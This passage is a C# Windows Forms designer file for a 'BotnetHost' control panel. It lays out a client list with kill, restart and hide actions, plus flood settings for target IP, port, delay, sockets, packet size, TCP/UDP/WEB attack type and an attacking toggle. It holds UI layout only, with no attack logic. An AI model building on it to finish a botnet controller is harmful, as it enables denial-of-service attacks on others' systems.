
namespace BotnetHost
{
    partial class MainPanel
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainPanel));
            this.serverPortLabel = new MetroFramework.Controls.MetroLabel();
            this.serverIPLabel = new MetroFramework.Controls.MetroLabel();
            this.serverIPV4Label = new MetroFramework.Controls.MetroLabel();
            this.serverToggle = new MetroFramework.Controls.MetroToggle();
            this.metroLabel10 = new MetroFramework.Controls.MetroLabel();
            this.metroPanel3 = new MetroFramework.Controls.MetroPanel();
            this.hideClientsBtn = new MetroFramework.Controls.MetroButton();
            this.packetSizeLabel = new MetroFramework.Controls.MetroLabel();
            this.metroLabel13 = new MetroFramework.Controls.MetroLabel();
            this.packetSizeTrackBar = new MetroFramework.Controls.MetroTrackBar();
            this.attackTypeComboBox = new MetroFramework.Controls.MetroComboBox();
            this.metroLabel9 = new MetroFramework.Controls.MetroLabel();
            this.restartClientsBtn = new MetroFramework.Controls.MetroButton();
            this.applySettingsBtn = new MetroFramework.Controls.MetroButton();
            this.attackingToggle = new MetroFramework.Controls.MetroToggle();
            this.metroLabel6 = new MetroFramework.Controls.MetroLabel();
            this.socketsLabel = new MetroFramework.Controls.MetroLabel();
            this.metroLabel11 = new MetroFramework.Controls.MetroLabel();
            this.socketsTrackBar = new MetroFramework.Controls.MetroTrackBar();
            this.delayLabel = new MetroFramework.Controls.MetroLabel();
            this.metroLabel8 = new MetroFramework.Controls.MetroLabel();
            this.metroLabel7 = new MetroFramework.Controls.MetroLabel();
            this.delayTrackBar = new MetroFramework.Controls.MetroTrackBar();
            this.metroTextBox2 = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel4 = new MetroFramework.Controls.MetroLabel();
            this.metroTextBox1 = new MetroFramework.Controls.MetroTextBox();
            this.metroLabel3 = new MetroFramework.Controls.MetroLabel();
            this.metroPanel1 = new MetroFramework.Controls.MetroPanel();
            this.clientListView = new MetroFramework.Controls.MetroListView();
            this.clientColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.metroLabel1 = new MetroFramework.Controls.MetroLabel();
            this.logListView = new MetroFramework.Controls.MetroListView();
            this.logColumn = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.metroLabel2 = new MetroFramework.Controls.MetroLabel();
            this.logContextMenu = new MetroFramework.Controls.MetroContextMenu(this.components);
            this.viewLogMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clientContextMenu = new MetroFramework.Controls.MetroContextMenu(this.components);
            this.killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.metroPanel3.SuspendLayout();
            this.metroPanel1.SuspendLayout();
            this.logContextMenu.SuspendLayout();
            this.clientContextMenu.SuspendLayout();
            this.SuspendLayout();
            // 
            // serverPortLabel
            // 
            this.serverPortLabel.Location = new System.Drawing.Point(658, 463);
            this.serverPortLabel.Margin = new System.Windows.Forms.Padding(3);
            this.serverPortLabel.Name = "serverPortLabel";
            this.serverPortLabel.Size = new System.Drawing.Size(287, 28);
            this.serverPortLabel.TabIndex = 23;
            this.serverPortLabel.Text = "PORT";
            this.serverPortLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.serverPortLabel.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.serverPortLabel.UseStyleColors = true;
            // 
            // serverIPLabel
            // 
            this.serverIPLabel.Location = new System.Drawing.Point(191, 463);
            this.serverIPLabel.Margin = new System.Windows.Forms.Padding(3);
            this.serverIPLabel.Name = "serverIPLabel";
            this.serverIPLabel.Size = new System.Drawing.Size(225, 28);
            this.serverIPLabel.TabIndex = 21;
            this.serverIPLabel.Text = "IP";
            this.serverIPLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.serverIPLabel.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.serverIPLabel.UseStyleColors = true;
            // 
            // serverIPV4Label
            // 
            this.serverIPV4Label.Location = new System.Drawing.Point(422, 463);
            this.serverIPV4Label.Margin = new System.Windows.Forms.Padding(3);
            this.serverIPV4Label.Name = "serverIPV4Label";
            this.serverIPV4Label.Size = new System.Drawing.Size(225, 28);
            this.serverIPV4Label.TabIndex = 19;
            this.serverIPV4Label.Text = "IPV4";
            this.serverIPV4Label.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.serverIPV4Label.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.serverIPV4Label.UseStyleColors = true;
            // 
            // serverToggle
            // 
            this.serverToggle.AutoEllipsis = true;
            this.serverToggle.CheckAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.serverToggle.Checked = true;
            this.serverToggle.CheckState = System.Windows.Forms.CheckState.Checked;
            this.serverToggle.FontSize = MetroFramework.MetroLinkSize.Medium;
            this.serverToggle.FontWeight = MetroFramework.MetroLinkWeight.Light;
            this.serverToggle.Location = new System.Drawing.Point(80, 463);
            this.serverToggle.Margin = new System.Windows.Forms.Padding(8);
            this.serverToggle.Name = "serverToggle";
            this.serverToggle.Size = new System.Drawing.Size(82, 28);
            this.serverToggle.TabIndex = 5;
            this.serverToggle.Text = "On";
            this.serverToggle.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.serverToggle.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.serverToggle.UseSelectable = true;
            this.serverToggle.CheckedChanged += new System.EventHandler(this.serverToggle_CheckedChanged);
            this.serverToggle.Click += new System.EventHandler(this.settingsChanged);
            // 
            // metroLabel10
            // 
            this.metroLabel10.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel10.FontWeight = MetroFramework.MetroLabelWeight.Bold;
            this.metroLabel10.Location = new System.Drawing.Point(4, 463);
            this.metroLabel10.Name = "metroLabel10";
            this.metroLabel10.Size = new System.Drawing.Size(65, 28);
            this.metroLabel10.TabIndex = 11;
            this.metroLabel10.Text = "Server\r\n:";
            this.metroLabel10.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.metroLabel10.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroPanel3
            // 
            this.metroPanel3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.metroPanel3.Controls.Add(this.hideClientsBtn);
            this.metroPanel3.Controls.Add(this.packetSizeLabel);
            this.metroPanel3.Controls.Add(this.metroLabel13);
            this.metroPanel3.Controls.Add(this.packetSizeTrackBar);
            this.metroPanel3.Controls.Add(this.attackTypeComboBox);
            this.metroPanel3.Controls.Add(this.metroLabel9);
            this.metroPanel3.Controls.Add(this.restartClientsBtn);
            this.metroPanel3.Controls.Add(this.applySettingsBtn);
            this.metroPanel3.Controls.Add(this.attackingToggle);
            this.metroPanel3.Controls.Add(this.metroLabel6);
            this.metroPanel3.Controls.Add(this.socketsLabel);
            this.metroPanel3.Controls.Add(this.metroLabel11);
            this.metroPanel3.Controls.Add(this.socketsTrackBar);
            this.metroPanel3.Controls.Add(this.delayLabel);
            this.metroPanel3.Controls.Add(this.metroLabel8);
            this.metroPanel3.Controls.Add(this.metroLabel7);
            this.metroPanel3.Controls.Add(this.delayTrackBar);
            this.metroPanel3.Controls.Add(this.metroTextBox2);
            this.metroPanel3.Controls.Add(this.metroLabel4);
            this.metroPanel3.Controls.Add(this.metroTextBox1);
            this.metroPanel3.HorizontalScrollbarBarColor = true;
            this.metroPanel3.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel3.HorizontalScrollbarSize = 10;
            this.metroPanel3.Location = new System.Drawing.Point(658, 26);
            this.metroPanel3.Name = "metroPanel3";
            this.metroPanel3.Size = new System.Drawing.Size(287, 431);
            this.metroPanel3.TabIndex = 6;
            this.metroPanel3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel3.VerticalScrollbarBarColor = true;
            this.metroPanel3.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel3.VerticalScrollbarSize = 10;
            // 
            // hideClientsBtn
            // 
            this.hideClientsBtn.Location = new System.Drawing.Point(151, 374);
            this.hideClientsBtn.Name = "hideClientsBtn";
            this.hideClientsBtn.Size = new System.Drawing.Size(130, 23);
            this.hideClientsBtn.TabIndex = 27;
            this.hideClientsBtn.Text = "Hide Clients";
            this.hideClientsBtn.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.hideClientsBtn.UseSelectable = true;
            this.hideClientsBtn.Click += new System.EventHandler(this.hideClientsBtn_Click);
            // 
            // packetSizeLabel
            // 
            this.packetSizeLabel.Location = new System.Drawing.Point(231, 134);
            this.packetSizeLabel.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.packetSizeLabel.Name = "packetSizeLabel";
            this.packetSizeLabel.Size = new System.Drawing.Size(50, 23);
            this.packetSizeLabel.TabIndex = 26;
            this.packetSizeLabel.Text = "32";
            this.packetSizeLabel.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.packetSizeLabel.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroLabel13
            // 
            this.metroLabel13.Location = new System.Drawing.Point(5, 134);
            this.metroLabel13.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroLabel13.Name = "metroLabel13";
            this.metroLabel13.Size = new System.Drawing.Size(80, 23);
            this.metroLabel13.TabIndex = 25;
            this.metroLabel13.Text = "Packet Size:";
            this.metroLabel13.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.metroLabel13.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // packetSizeTrackBar
            // 
            this.packetSizeTrackBar.BackColor = System.Drawing.Color.Transparent;
            this.packetSizeTrackBar.LargeChange = 2;
            this.packetSizeTrackBar.Location = new System.Drawing.Point(89, 134);
            this.packetSizeTrackBar.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.packetSizeTrackBar.Maximum = 5120;
            this.packetSizeTrackBar.Minimum = 32;
            this.packetSizeTrackBar.Name = "packetSizeTrackBar";
            this.packetSizeTrackBar.Size = new System.Drawing.Size(136, 23);
            this.packetSizeTrackBar.TabIndex = 24;
            this.packetSizeTrackBar.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.packetSizeTrackBar.Value = 32;
            this.packetSizeTrackBar.ValueChanged += new System.EventHandler(this.updateTrackBars);
            // 
            // attackTypeComboBox
            // 
            this.attackTypeComboBox.FontSize = MetroFramework.MetroComboBoxSize.Small;
            this.attackTypeComboBox.FormattingEnabled = true;
            this.attackTypeComboBox.ItemHeight = 19;
            this.attackTypeComboBox.Items.AddRange(new object[] {
            "TCP",
            "UDP",
            "WEB"});
            this.attackTypeComboBox.Location = new System.Drawing.Point(89, 177);
            this.attackTypeComboBox.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.attackTypeComboBox.Name = "attackTypeComboBox";
            this.attackTypeComboBox.PromptText = "TCP";
            this.attackTypeComboBox.Size = new System.Drawing.Size(192, 25);
            this.attackTypeComboBox.TabIndex = 23;
            this.attackTypeComboBox.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.attackTypeComboBox.UseSelectable = true;
            // 
            // metroLabel9
            // 
            this.metroLabel9.Location = new System.Drawing.Point(5, 177);
            this.metroLabel9.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroLabel9.Name = "metroLabel9";
            this.metroLabel9.Size = new System.Drawing.Size(80, 25);
            this.metroLabel9.TabIndex = 22;
            this.metroLabel9.Text = "Type:";
            this.metroLabel9.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.metroLabel9.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // restartClientsBtn
            // 
            this.restartClientsBtn.Location = new System.Drawing.Point(5, 374);
            this.restartClientsBtn.Name = "restartClientsBtn";
            this.restartClientsBtn.Size = new System.Drawing.Size(130, 23);
            this.restartClientsBtn.TabIndex = 21;
            this.restartClientsBtn.Text = "Restart Clients";
            this.restartClientsBtn.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.restartClientsBtn.UseSelectable = true;
            this.restartClientsBtn.Click += new System.EventHandler(this.restartClientsBtn_Click);
            // 
            // applySettingsBtn
            // 
            this.applySettingsBtn.Location = new System.Drawing.Point(5, 403);
            this.applySettingsBtn.Name = "applySettingsBtn";
            this.applySettingsBtn.Size = new System.Drawing.Size(276, 23);
            this.applySettingsBtn.TabIndex = 20;
            this.applySettingsBtn.Text = "Apply Settings";
            this.applySettingsBtn.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.applySettingsBtn.UseSelectable = true;
            this.applySettingsBtn.Click += new System.EventHandler(this.settingsChanged);
            // 
            // attackingToggle
            // 
            this.attackingToggle.CheckAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.attackingToggle.Location = new System.Drawing.Point(89, 222);
            this.attackingToggle.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.attackingToggle.Name = "attackingToggle";
            this.attackingToggle.Size = new System.Drawing.Size(192, 23);
            this.attackingToggle.TabIndex = 19;
            this.attackingToggle.Text = "Off";
            this.attackingToggle.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.attackingToggle.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.attackingToggle.UseSelectable = true;
            // 
            // metroLabel6
            // 
            this.metroLabel6.Location = new System.Drawing.Point(5, 222);
            this.metroLabel6.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroLabel6.Name = "metroLabel6";
            this.metroLabel6.Size = new System.Drawing.Size(78, 23);
            this.metroLabel6.TabIndex = 18;
            this.metroLabel6.Text = "Attacking:";
            this.metroLabel6.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.metroLabel6.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // socketsLabel
            // 
            this.socketsLabel.Location = new System.Drawing.Point(231, 91);
            this.socketsLabel.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.socketsLabel.Name = "socketsLabel";
            this.socketsLabel.Size = new System.Drawing.Size(50, 23);
            this.socketsLabel.TabIndex = 15;
            this.socketsLabel.Text = "8";
            this.socketsLabel.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.socketsLabel.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroLabel11
            // 
            this.metroLabel11.Location = new System.Drawing.Point(5, 91);
            this.metroLabel11.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroLabel11.Name = "metroLabel11";
            this.metroLabel11.Size = new System.Drawing.Size(80, 23);
            this.metroLabel11.TabIndex = 14;
            this.metroLabel11.Text = "Sockets:";
            this.metroLabel11.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.metroLabel11.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // socketsTrackBar
            // 
            this.socketsTrackBar.BackColor = System.Drawing.Color.Transparent;
            this.socketsTrackBar.LargeChange = 2;
            this.socketsTrackBar.Location = new System.Drawing.Point(89, 91);
            this.socketsTrackBar.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.socketsTrackBar.Minimum = 1;
            this.socketsTrackBar.Name = "socketsTrackBar";
            this.socketsTrackBar.Size = new System.Drawing.Size(136, 23);
            this.socketsTrackBar.TabIndex = 13;
            this.socketsTrackBar.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.socketsTrackBar.Value = 8;
            this.socketsTrackBar.ValueChanged += new System.EventHandler(this.updateTrackBars);
            // 
            // delayLabel
            // 
            this.delayLabel.Location = new System.Drawing.Point(231, 48);
            this.delayLabel.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.delayLabel.Name = "delayLabel";
            this.delayLabel.Size = new System.Drawing.Size(50, 23);
            this.delayLabel.TabIndex = 9;
            this.delayLabel.Text = "15000";
            this.delayLabel.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.delayLabel.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroLabel8
            // 
            this.metroLabel8.Location = new System.Drawing.Point(5, 48);
            this.metroLabel8.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroLabel8.Name = "metroLabel8";
            this.metroLabel8.Size = new System.Drawing.Size(78, 23);
            this.metroLabel8.TabIndex = 8;
            this.metroLabel8.Text = "Delay (ms):";
            this.metroLabel8.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.metroLabel8.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroLabel7
            // 
            this.metroLabel7.Location = new System.Drawing.Point(184, 5);
            this.metroLabel7.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroLabel7.Name = "metroLabel7";
            this.metroLabel7.Size = new System.Drawing.Size(41, 23);
            this.metroLabel7.TabIndex = 7;
            this.metroLabel7.Text = "Port:";
            this.metroLabel7.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.metroLabel7.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // delayTrackBar
            // 
            this.delayTrackBar.BackColor = System.Drawing.Color.Transparent;
            this.delayTrackBar.Location = new System.Drawing.Point(89, 48);
            this.delayTrackBar.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.delayTrackBar.Maximum = 30000;
            this.delayTrackBar.Minimum = 10;
            this.delayTrackBar.Name = "delayTrackBar";
            this.delayTrackBar.Size = new System.Drawing.Size(136, 23);
            this.delayTrackBar.TabIndex = 7;
            this.delayTrackBar.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.delayTrackBar.Value = 15000;
            this.delayTrackBar.ValueChanged += new System.EventHandler(this.updateTrackBars);
            // 
            // metroTextBox2
            // 
            // 
            // 
            // 
            this.metroTextBox2.CustomButton.Image = null;
            this.metroTextBox2.CustomButton.Location = new System.Drawing.Point(28, 1);
            this.metroTextBox2.CustomButton.Name = "";
            this.metroTextBox2.CustomButton.Size = new System.Drawing.Size(21, 21);
            this.metroTextBox2.CustomButton.Style = MetroFramework.MetroColorStyle.Blue;
            this.metroTextBox2.CustomButton.TabIndex = 1;
            this.metroTextBox2.CustomButton.Theme = MetroFramework.MetroThemeStyle.Light;
            this.metroTextBox2.CustomButton.UseSelectable = true;
            this.metroTextBox2.CustomButton.Visible = false;
            this.metroTextBox2.Lines = new string[] {
        "12345"};
            this.metroTextBox2.Location = new System.Drawing.Point(231, 5);
            this.metroTextBox2.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroTextBox2.MaxLength = 32767;
            this.metroTextBox2.Name = "metroTextBox2";
            this.metroTextBox2.PasswordChar = '\0';
            this.metroTextBox2.PromptText = "Port";
            this.metroTextBox2.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.metroTextBox2.SelectedText = "";
            this.metroTextBox2.SelectionLength = 0;
            this.metroTextBox2.SelectionStart = 0;
            this.metroTextBox2.ShortcutsEnabled = true;
            this.metroTextBox2.Size = new System.Drawing.Size(50, 23);
            this.metroTextBox2.TabIndex = 6;
            this.metroTextBox2.Text = "12345";
            this.metroTextBox2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox2.UseSelectable = true;
            this.metroTextBox2.WaterMark = "Port";
            this.metroTextBox2.WaterMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
            this.metroTextBox2.WaterMarkFont = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Pixel);
            // 
            // metroLabel4
            // 
            this.metroLabel4.Location = new System.Drawing.Point(5, 5);
            this.metroLabel4.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroLabel4.Name = "metroLabel4";
            this.metroLabel4.Size = new System.Drawing.Size(78, 23);
            this.metroLabel4.TabIndex = 3;
            this.metroLabel4.Text = "IP:";
            this.metroLabel4.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.metroLabel4.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroTextBox1
            // 
            // 
            // 
            // 
            this.metroTextBox1.CustomButton.Image = null;
            this.metroTextBox1.CustomButton.Location = new System.Drawing.Point(67, 1);
            this.metroTextBox1.CustomButton.Name = "";
            this.metroTextBox1.CustomButton.Size = new System.Drawing.Size(21, 21);
            this.metroTextBox1.CustomButton.Style = MetroFramework.MetroColorStyle.Blue;
            this.metroTextBox1.CustomButton.TabIndex = 1;
            this.metroTextBox1.CustomButton.Theme = MetroFramework.MetroThemeStyle.Light;
            this.metroTextBox1.CustomButton.UseSelectable = true;
            this.metroTextBox1.CustomButton.Visible = false;
            this.metroTextBox1.Lines = new string[] {
        "localhost"};
            this.metroTextBox1.Location = new System.Drawing.Point(89, 5);
            this.metroTextBox1.Margin = new System.Windows.Forms.Padding(5, 5, 15, 15);
            this.metroTextBox1.MaxLength = 32767;
            this.metroTextBox1.Name = "metroTextBox1";
            this.metroTextBox1.PasswordChar = '\0';
            this.metroTextBox1.PromptText = "IP Address";
            this.metroTextBox1.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.metroTextBox1.SelectedText = "";
            this.metroTextBox1.SelectionLength = 0;
            this.metroTextBox1.SelectionStart = 0;
            this.metroTextBox1.ShortcutsEnabled = true;
            this.metroTextBox1.Size = new System.Drawing.Size(89, 23);
            this.metroTextBox1.TabIndex = 2;
            this.metroTextBox1.Text = "localhost";
            this.metroTextBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox1.UseSelectable = true;
            this.metroTextBox1.WaterMark = "IP Address";
            this.metroTextBox1.WaterMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
            this.metroTextBox1.WaterMarkFont = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Pixel);
            // 
            // metroLabel3
            // 
            this.metroLabel3.FontWeight = MetroFramework.MetroLabelWeight.Bold;
            this.metroLabel3.Location = new System.Drawing.Point(658, 4);
            this.metroLabel3.Name = "metroLabel3";
            this.metroLabel3.Size = new System.Drawing.Size(287, 19);
            this.metroLabel3.TabIndex = 4;
            this.metroLabel3.Text = "Client Settings";
            this.metroLabel3.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.metroLabel3.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroPanel1
            // 
            this.metroPanel1.Controls.Add(this.serverPortLabel);
            this.metroPanel1.Controls.Add(this.serverIPV4Label);
            this.metroPanel1.Controls.Add(this.serverIPLabel);
            this.metroPanel1.Controls.Add(this.clientListView);
            this.metroPanel1.Controls.Add(this.metroLabel3);
            this.metroPanel1.Controls.Add(this.serverToggle);
            this.metroPanel1.Controls.Add(this.metroLabel10);
            this.metroPanel1.Controls.Add(this.metroPanel3);
            this.metroPanel1.Controls.Add(this.metroLabel1);
            this.metroPanel1.Controls.Add(this.logListView);
            this.metroPanel1.Controls.Add(this.metroLabel2);
            this.metroPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.metroPanel1.HorizontalScrollbarBarColor = true;
            this.metroPanel1.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel1.HorizontalScrollbarSize = 10;
            this.metroPanel1.Location = new System.Drawing.Point(20, 30);
            this.metroPanel1.Name = "metroPanel1";
            this.metroPanel1.Size = new System.Drawing.Size(951, 499);
            this.metroPanel1.TabIndex = 2;
            this.metroPanel1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel1.VerticalScrollbarBarColor = true;
            this.metroPanel1.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel1.VerticalScrollbarSize = 10;
            // 
            // clientListView
            // 
            this.clientListView.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.clientListView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.clientListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.clientColumn});
            this.clientListView.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.clientListView.FullRowSelect = true;
            this.clientListView.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None;
            this.clientListView.Location = new System.Drawing.Point(4, 26);
            this.clientListView.Name = "clientListView";
            this.clientListView.OwnerDraw = true;
            this.clientListView.Size = new System.Drawing.Size(643, 261);
            this.clientListView.TabIndex = 7;
            this.clientListView.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.clientListView.UseCompatibleStateImageBehavior = false;
            this.clientListView.UseCustomBackColor = true;
            this.clientListView.UseSelectable = true;
            this.clientListView.View = System.Windows.Forms.View.Details;
            this.clientListView.MouseDown += new System.Windows.Forms.MouseEventHandler(this.clientListView_MouseDown);
            // 
            // clientColumn
            // 
            this.clientColumn.Text = "Client";
            this.clientColumn.Width = 635;
            // 
            // metroLabel1
            // 
            this.metroLabel1.FontWeight = MetroFramework.MetroLabelWeight.Bold;
            this.metroLabel1.Location = new System.Drawing.Point(4, 4);
            this.metroLabel1.Name = "metroLabel1";
            this.metroLabel1.Size = new System.Drawing.Size(643, 19);
            this.metroLabel1.TabIndex = 2;
            this.metroLabel1.Text = "Clients";
            this.metroLabel1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.metroLabel1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // logListView
            // 
            this.logListView.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.logListView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.logListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.logColumn});
            this.logListView.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.logListView.FullRowSelect = true;
            this.logListView.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None;
            this.logListView.Location = new System.Drawing.Point(4, 312);
            this.logListView.Name = "logListView";
            this.logListView.OwnerDraw = true;
            this.logListView.Size = new System.Drawing.Size(643, 145);
            this.logListView.TabIndex = 5;
            this.logListView.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.logListView.UseCompatibleStateImageBehavior = false;
            this.logListView.UseCustomBackColor = true;
            this.logListView.UseSelectable = true;
            this.logListView.View = System.Windows.Forms.View.Details;
            this.logListView.MouseDown += new System.Windows.Forms.MouseEventHandler(this.activityLogListView_MouseDown);
            // 
            // logColumn
            // 
            this.logColumn.Text = "Log Item";
            this.logColumn.Width = 635;
            // 
            // metroLabel2
            // 
            this.metroLabel2.FontWeight = MetroFramework.MetroLabelWeight.Bold;
            this.metroLabel2.Location = new System.Drawing.Point(4, 290);
            this.metroLabel2.Name = "metroLabel2";
            this.metroLabel2.Size = new System.Drawing.Size(643, 19);
            this.metroLabel2.TabIndex = 4;
            this.metroLabel2.Text = "Server Log";
            this.metroLabel2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.metroLabel2.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // logContextMenu
            // 
            this.logContextMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.viewLogMenuItem});
            this.logContextMenu.Name = "clientContextMenu";
            this.logContextMenu.Size = new System.Drawing.Size(171, 26);
            // 
            // viewLogMenuItem
            // 
            this.viewLogMenuItem.Name = "viewLogMenuItem";
            this.viewLogMenuItem.Size = new System.Drawing.Size(170, 22);
            this.viewLogMenuItem.Text = "View Full Message";
            this.viewLogMenuItem.Click += new System.EventHandler(this.viewLogMenuItem_Click);
            // 
            // clientContextMenu
            // 
            this.clientContextMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.killToolStripMenuItem,
            this.restartToolStripMenuItem,
            this.hideToolStripMenuItem});
            this.clientContextMenu.Name = "clientContextMenu";
            this.clientContextMenu.Size = new System.Drawing.Size(134, 70);
            // 
            // killToolStripMenuItem
            // 
            this.killToolStripMenuItem.Name = "killToolStripMenuItem";
            this.killToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.killToolStripMenuItem.Text = "Kill";
            this.killToolStripMenuItem.Click += new System.EventHandler(this.killToolStripMenuItem_Click);
            // 
            // restartToolStripMenuItem
            // 
            this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
            this.restartToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.restartToolStripMenuItem.Text = "Restart";
            this.restartToolStripMenuItem.Click += new System.EventHandler(this.restartToolStripMenuItem_Click);
            // 
            // hideToolStripMenuItem
            // 
            this.hideToolStripMenuItem.Name = "hideToolStripMenuItem";
            this.hideToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.hideToolStripMenuItem.Text = "Show/Hide";
            this.hideToolStripMenuItem.Click += new System.EventHandler(this.hideToolStripMenuItem_Click);
            // 
            // MainPanel
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.ClientSize = new System.Drawing.Size(991, 549);
            this.Controls.Add(this.metroPanel1);
